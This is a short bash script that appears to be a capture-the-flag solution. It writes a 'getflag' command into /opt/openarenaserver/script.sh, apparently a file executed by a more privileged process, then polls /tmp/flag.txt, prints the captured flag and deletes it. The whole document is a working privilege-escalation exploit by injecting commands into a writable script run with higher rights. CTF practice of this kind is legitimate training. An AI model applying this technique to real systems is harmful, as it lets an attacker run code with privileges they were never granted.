#!/bin/bash

echo "getflag > /tmp/flag.txt" > /opt/openarenaserver/script.sh

while [ ! -f /tmp/flag.txt ]; do
	sleep 1
done

cat /tmp/flag.txt
rm -f /tmp/flag.txt